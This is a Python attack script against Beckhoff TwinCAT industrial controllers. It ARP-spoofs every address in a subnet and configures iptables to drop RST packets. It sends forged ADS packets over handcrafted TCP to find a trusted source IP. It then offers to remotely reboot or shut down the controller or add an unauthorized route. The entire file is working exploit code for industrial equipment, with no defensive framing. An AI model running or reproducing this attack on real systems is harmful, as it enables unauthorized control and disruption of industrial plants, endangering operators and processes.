#!/usr/bin/python3
# -*- coding: utf-8 -*-
## This will brute force a device for known routes

#IP = sys.argv[1]
#sIP = '192.168.50.153'
iPORT = 48898
iTIMEOUT = 1

try:
    import sys, socket, binascii, os, subprocess, re, struct, time, _thread, random
    #from threading import Thread
    from ctypes import CDLL, POINTER, Structure, c_void_p, c_char_p, c_ushort, c_char, c_long, c_int, c_uint, c_ubyte, byref, create_string_buffer, util
except Exception as e:
    print('Error loading modules: '+str(e))
    sys.exit(1)

if os.name == 'nt':
    print('[!] Critical error: ')
    print('  Spoofing packets, ARP poisoning and dropping kernel packets ...')
    input('  is not supported on Windows, please switch to Linux.')
    sys.exit(0)

try:
    print('--- Loading Scapy, might take some time ...')
    from scapy.config import conf
    conf.ipv6_enabled = False
    import scapy.all as scapy
    scapy.conf.verb = 0
except:
    print('Error while loading scapy, please run "pip install scapy"')
    sys.exit(1)

def ipToHex(ipstr):
    iphexstr = ''
    for s in ipstr.split('.'):
        if len(hex(int(s))[2:]) == 1: iphexstr += '0'
        iphexstr += str(hex(int(s))[2:])
    return iphexstr

def hexToIP(hexstr):
    oReturn = []
    for i in range(0, len(hexstr),2):
        oReturn.append(str( int(hexstr[i:i+2],16)) )
    return ".".join(oReturn)

def getNetIDAsString(sHexNetID):
    sNetID = ''
    for i in range (0, len(sHexNetID), 2): sNetID += str(int(sHexNetID[i:i+2], 16)) + '.'
    if len(sNetID) > 0: sNetID = sNetID[:-1]
    return sNetID

def reverseByte(xInputData): ## Will return input b'12345678' as b'78563412' and '12345678' as '78563412'
    if isinstance(xInputData, bytes): return b''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])
    else: return ''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])

def getRemoteMAC(sTargetIP):
    #os.system('ping -c 1 -W 1 ' + sTargetIP + ' > /dev/null')
    os.system('ping -c 1 -W 1 {} > /dev/null'.format(sTargetIP))
    #proc = subprocess.Popen(["ip neigh show " + sTargetIP + " | cut -d\" \" -f5"], shell=True, stdout=subprocess.PIPE)
    proc = subprocess.Popen(['ip neigh show {} | cut -d" " -f5'.format(sTargetIP)], shell=True, stdout=subprocess.PIPE)
    try: sDestMAC = re.findall(r'(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})', proc.stdout.readlines()[0].decode(errors='ignore').replace('-',':'))[0][0]
    except Exception as Error: 
        print('Error: '+str(Error))
        sys.exit(1)
    return sDestMAC

def selectInterface(): #adapter[] = npfdevice, ip, mac
    def getAllInterfaces(): 
        lstInterfaces=[]
        if os.name == 'nt':
            proc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V disconnected', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.split(b',')
                sAdapter = lstInt[0].strip(b'"').decode()
                sDevicename = lstInt[1].strip(b'"').decode()
                sMAC = lstInt[2].strip(b'"').decode().lower().replace('-', ':')
                sWinguID = lstInt[3].strip().strip(b'"').decode()[-38:]
                proc = subprocess.Popen('netsh int ip show addr "{}" | FINDSTR /I IP'.format(sAdapter), shell=True, stdout=subprocess.PIPE)
                
                try: sIP = re.findall(r'[0-9]+(?:\.[0-9]+){3}', proc.stdout.readlines()[0].strip().decode())[0]
                except: sIP = ''
                if len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID]) # When no or bad MAC address (e.g. PPP adapter), do not add
        else:
            proc = subprocess.Popen('for i in $(ip address | grep -v "lo" | grep "default" | cut -d":" -f2 | cut -d" " -f2);do echo $i $(ip address show dev $i | grep "inet " | cut -d" " -f6 | cut -d"/" -f1) $(ip address show dev $i | grep "ether" | cut -d" " -f6);done', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.strip().split(b' ')
                try: 
                    if len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])
                except: pass
        return lstInterfaces
    
    lstInterfaces = getAllInterfaces()
    i = 1
    for lstInt in lstInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guID
        print('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))
        i += 1
    if i > 2: sAnswer = input('[?] Please select the adapter [1]: ')
    else: sAnswer = None
    if not sAnswer or sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) >= i: sAnswer = 1
    iAnswer = int(sAnswer) - 1
    sNPF = lstInterfaces[iAnswer][0]
    sIP = lstInterfaces[iAnswer][1]
    sMAC = lstInterfaces[iAnswer][2]
    if os.name == 'nt': sNPF = r'\Device\NPF_' + lstInterfaces[iAnswer][4]
    return (sNPF, sIP, sMAC)

def getIPArray(sCIDR):
    (sIP, sCIDR) = sCIDR.split('/')
    iCIDR = int(sCIDR)
    host_bits = 32 - iCIDR
    i = struct.unpack('>I', socket.inet_aton(sIP))[0]
    iStart = (i >> host_bits) << host_bits # clear the host bits
    iEnd = iStart | ((1 << host_bits) - 1)

    arrIP=[]
    # excludes the first and last address in the subnet
    for x in range(iStart+1, iEnd-1):
        arrIP.append(socket.inet_ntoa(struct.pack('>I',x)))
    return arrIP

def arpSpoof(oSrcAdapter, sSpoofIP, sTargetIP, iSeconds):
    sDestMAC = getRemoteMAC(sTargetIP)
    oARP = scapy.ARP(op=2, pdst=sTargetIP, hwdst=sDestMAC, psrc=sSpoofIP, hwsrc=oSrcAdapter[2])
    try:
        for i in range(0,iSeconds):
            scapy.send(oARP)
            time.sleep(1)
    except Exception as Error:
        print('Error: '+str(Error))
        sys.exit(1)
    
    try: 
        oARPfix = scapy.ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=sTargetIP, hwsrc=sDestMAC, psrc=sTargetIP)
        scapy.send(oARPfix, count=5)
    except: pass
    sys.exit(1)

def getUDPInfo(oAdapter, sTargetIP):
    data = '03661471 0000000001000000' + ipToHex(oAdapter[1] + '.1.1')  + '1027 00000000' 
    oIP = scapy.IP(dst=sTargetIP)
    oUDP = scapy.UDP(sport=random.randint(1024,65535), dport=48899)
    oLoad = scapy.Raw(load=binascii.unhexlify(data.replace(' ', '')))
    oResp = scapy.sr1(oIP/oUDP/oLoad, timeout=iTIMEOUT)
    if oResp is None:
        print('[!] Error, device not responding to TwinCAT discovery packets!')
        return None
    hexdata = oResp.load.hex().encode()
    bNetID = hexdata[24:36]
    iNamelength = int(hexdata[54:56]+hexdata[52:54],16)
    sName= oResp.load[28:27+iNamelength].decode(errors='ignore')
    i = (27+iNamelength)*2 + 18
    sKernel = '{}.{}.{}'.format(int(reverseByte(hexdata[i:i+8]),16), int(reverseByte(hexdata[i+8:i+16]),16), int(reverseByte(hexdata[i+16:i+24]),16))
    i = i+24+528
    sTwinCatVersion = '{}.{}.{}'.format(int(hexdata[i:i+2], 16), int(hexdata[i+2:i+4],16), int(reverseByte(hexdata[i+4:i+8]),16))
    print('[+] IP: {}, NAME: {}, RNETID: {}, TCVer: {}, Winver: {}'.format(sTargetIP, sName, getNetIDAsString(bNetID), sTwinCatVersion, sKernel))
    return getNetIDAsString(bNetID)

def getGateway():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def confIPTables(sDstIP, bSet=True):
    if not bSet:
        proc = subprocess.Popen('iptables -D OUTPUT -p tcp -m tcp --tcp-flags RST RST -j DROP -d '+sDstIP, shell=True, stdout=subprocess.PIPE)
        return
    proc = subprocess.Popen('iptables -S OUTPUT | grep tcp | grep "RST RST" | grep DROP | wc -l', shell=True, stdout=subprocess.PIPE)
    strResult = proc.stdout.readlines()
    if int(strResult[0]) == 0:
        print('[+] Configuring iptables (dropping kernel RST packets)')
        proc = subprocess.Popen('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '+sDstIP+' -j DROP', shell=True, stdout=subprocess.PIPE)
    return
 
def spoofTCPPacket(oSrcAdapter, sSrcIP, sTargetIP, iDPort, dPacket):
    # SYN
    sport=random.randint(1024, 65535)
    ip=scapy.IP(src=sSrcIP,dst=sTargetIP)
    SYN=scapy.TCP(sport=sport,dport=iDPort,flags='S',seq=1000)
    SYNACK=scapy.sr1(ip/SYN, timeout=iTIMEOUT)
    if SYNACK is None: return SYNACK ## No SYN/ACK back, ARP Spoofing problem or port not open

    # ACK
    ACK=scapy.TCP(sport=sport, dport=iDPort, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    scapy.send(ip/ACK)

    # TCP DATA
    scapy.conf.verb = 0
    oIP=scapy.IP(src=sSrcIP,dst=sTargetIP)
    oTCP=scapy.TCP(sport=sport, dport=iDPort, flags='PA', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    oRAW=scapy.Raw(load=dPacket)
    oResp = scapy.sr1(oIP/oTCP/oRAW, timeout=iTIMEOUT)
    
    # FIN
    FINACK = None
    if not oResp is None: 
        FIN=scapy.TCP(sport=sport, dport=iDPort, flags='FA', seq=oResp.ack, ack=oResp.seq + 1)
        FINACK=scapy.sr1(ip/FIN, timeout=iTIMEOUT)
    if not FINACK is None:
        LASTACK=scapy.TCP(sport=sport, dport=iDPort, flags='A', seq=FINACK.ack, ack=FINACK.seq + 1)
        scapy.send(ip/LASTACK)

    # RST
    #RST=scapy.TCP(sport=sport, dport=iDPort, flags='R', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    #scapy.send(ip/RST)
    return oResp
    

def getResult(oSrcAdapter, sSrcIP, sTargetIP, RNETID):
    packet='000020000000'
    #packet+= '0a01be1e0101' ## RNETID (10.1.190.30.1.1), two last bytes not important
    packet+= ipToHex(RNETID)
    packet+= '1027'
    #LNETID = ipToHex('192.168.50.1.0.0') ## Two last bytes not important
    LNETID = ipToHex(sSrcIP+'.1.1')
    packet+= LNETID
    packet+= '018004000400000000000000000009000000' ## Get Info
    data = binascii.unhexlify(packet.replace(' ',''))

    oResp = spoofTCPPacket(oSrcAdapter, sSrcIP, sTargetIP, iPORT, data)
    if(str(type(oResp))=="<type 'NoneType'>" or not oResp):
        print('[-] Port closed, TwinCAT not running?')
        return False
    else: 
        #print(oResp.summary())
        dResp = oResp.getlayer(scapy.Raw)
        if dResp == None:
            #print('[!] Warning: Connection works, but empty response, Local Net ID not correct')
            return False
        data = binascii.hexlify(dResp.load)
        if data[-8:-6]==b'06': print('[+] Halleluja, {} works! Device in STOP mode'.format(sSrcIP))
        elif data[-8:-6]==b'0f': print('[+] Yes, {} works! Device in CONFIG mode'.format(sSrcIP))
        else: print('[+] Nice, {} works! Device in RUN mode'.format(sSrcIP))
        return True
    return False

def restartDevice(oSrcAdapter, sSrcIP, sTargetIP, sRNETID):
    packet ='0000 2c00 0000'
    packet+= ipToHex(sRNETID)
    packet+= '1027'
    packet+= ipToHex(sSrcIP+'.1.1')
    packet+= 'f280 0500 0400 0c000000 00000000 5d220000 0c00 0100 04000000 00000000' ## Reboot with timeout 0 
    dPacket = binascii.unhexlify(packet.replace(' ',''))
    
    oResp = spoofTCPPacket(oSrcAdapter, sSrcIP, sTargetIP, iPORT, dPacket)
    if not oResp is None:
        sResp = oResp.getlayer(scapy.Raw)
        print('[+] Success, should be rebooting now')
    else: print('[!] No response from device, ARP Poisong has worn out probably')
    return

def shutdownDevice(oSrcAdapter, sSrcIP, sTargetIP, sRNETID):
    packet ='0000 2c00 0000'
    packet+= ipToHex(sRNETID)
    packet+= '1027'
    packet+= ipToHex(sSrcIP+'.1.1')
    packet+= 'f280 0500 0400 0c000000 00000000 5d220000 0c00 0000 04000000 00000000' ## Shutdown with timeout 0 
    dPacket = binascii.unhexlify(packet.replace(' ',''))
    
    oResp = spoofTCPPacket(oSrcAdapter, sSrcIP, sTargetIP, iPORT, dPacket)
    if not oResp is None:
        sResp = oResp.getlayer(scapy.Raw)
        print('[+] Success, should be shutting down now')
    else: print('[!] No response from device, ARP Poisoning probably worn out')
    return

def addRoute(oSrcAdapter, sSrcIP, sTargetIP, sRNETID):
    def convertInt(iInput, length): return struct.pack('<I' , int(iInput)).hex()[:length]
    sNewIP = oSrcAdapter[1]
    sNewNETID = sNewIP + '.1.1'
    sNewName = input('Please enter route name [\'TEST\']: ')
    if sNewName == '': sNewName = 'TEST'
    ## Since TC3 4024 (August 2019), adding routes only works when the target IP has port 48898 open:
    oSock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('[!] Opening TCP socket on ' + sNewIP + ':48898')
    oSock2.bind((sNewIP,48898))
    oSock2.listen(1)
    sData = ipToHex(sNewNETID)
    sData += '0100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000'
    sData += convertInt(len(sNewIP) + 1 , 8) ## '0c00 0000' ## Length of IP address string ("11.12.13.14" == 12 bytes)
    sData += convertInt(len(sNewName) + 1, 8) ## '0500 0000'
    sData += '0000 0000'
    sData += sNewIP.encode().hex() + '00' + sNewName.upper().encode().hex() + '00'
    
    packet = '0000'
    #packet += '69000000' ## 0x58 + len(sNewIP) + len(sNewName) + 2
    packet += convertInt(0x58 + len(sNewIP) + len(sNewName) + 2, 8)
    packet += ipToHex(sRNETID)
    packet += '1027'
    packet += ipToHex(sSrcIP + '.1.1')
    packet += '5e01 0300 0400 '
    #packet += '49000000' ## 0x38 + len(sNewIP) + len(sNewName) + 2
    packet += convertInt(0x38 + len(sNewIP) + len(sNewName) + 2, 8)
    packet += '00000000 040001ff2103000000000000'
    #packet += '3d000000' ## length 0x2c + len(sNewIP) + len(sNewName) + 2
    packet += convertInt(0x2c + len(sNewIP) + len(sNewName) + 2, 8)
    packet += sData
    bPacket = bytes.fromhex(packet.replace(' ',''))

    sResp = str(spoofTCPPacket(oSrcAdapter, sSrcIP, sTargetIP, iPORT, bPacket).getlayer(scapy.Raw))
    if sResp == 'None': print('[-] Failed, maybe ARP Spoof has timed out (5 seconds)')
    else: print('[+] Success, route for this IP ('+sNewIP+') should be added')
    oSock2.close()
    return

##### MAIN PROGRAM #####
def main(argv):
    oInt = selectInterface()
    sIP = input('Now please enter the target IP address [192.168.50.128]: ')
    if sIP == '': sIP = '192.168.50.128'
    print('-- Alright, let\'s first find out some information about our target')
    sNETID = getUDPInfo(oInt,sIP)
    if sNETID == None: sNETID = sIP+'.1.1'
    sDefaultSubnet = oInt[1][:oInt[1].rfind('.')]+'.0/24'
    CIDR = input('Please enter subnet to scan ['+sDefaultSubnet+']: ')
    if(CIDR==''): CIDR=sDefaultSubnet
    arrIPs = getIPArray(CIDR)
    sDefaultGateway = getGateway()
    sWorkingIP = ''
    
    confIPTables(sIP)
    
    if not sDefaultGateway in arrIPs and not sDefaultGateway is None:
        print('[!] Warning: Default Gateway (' + sDefaultGateway + ') not in range, will spoof that too')
        _thread.start_new_thread(arpSpoof, (oInt, sDefaultGateway, sIP, 999)) ## Also spoofing the gateway when we are using a IP range not in subnet
    try: 
        for ip in arrIPs:
            print('Trying: '+ip)
            _thread.start_new_thread(arpSpoof, (oInt, ip, sIP, 5)) ## oSourceAdapter, sSpoofIP, sDestIP, timetospoof
            time.sleep(.5)
            bResult = getResult(oInt, ip, sIP, sNETID)
            if bResult: 
                sWorkingIP = ip
                break
    except KeyboardInterrupt:
        print('-- Exit detected, cleaning up')
        pass
    
    if not sWorkingIP == '':
        print('[+] Eureka, want proof? What do you want to do? ')
        ans = input('Reboot (R), Shutdown (S), AddRoute (A) [A]: ')
        if ans.lower() == 'r': restartDevice(oInt, sWorkingIP, sIP, sNETID)
        elif ans.lower() == 's': shutdownDevice(oInt, sWorkingIP, sIP, sNETID)
        else: addRoute(oInt, sWorkingIP, sIP, sNETID)

    #thread.start_new_thread(arpSpoof, (oInt, '192.168.50.144', sIP, 5)) ## oSourceAdapter, sSpoofIP, sDestIP, timetospoof
    #time.sleep(1)
    #getResult(oInt, '192.168.50.144', sIP, sNETID)
    print('\n[!] Restoring ARP tables')
    time.sleep(4)
    confIPTables(sIP,False)
    print('[!] All Done')

if __name__ == '__main__':
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print('SIGINT pressed')
        sys.exit(1)
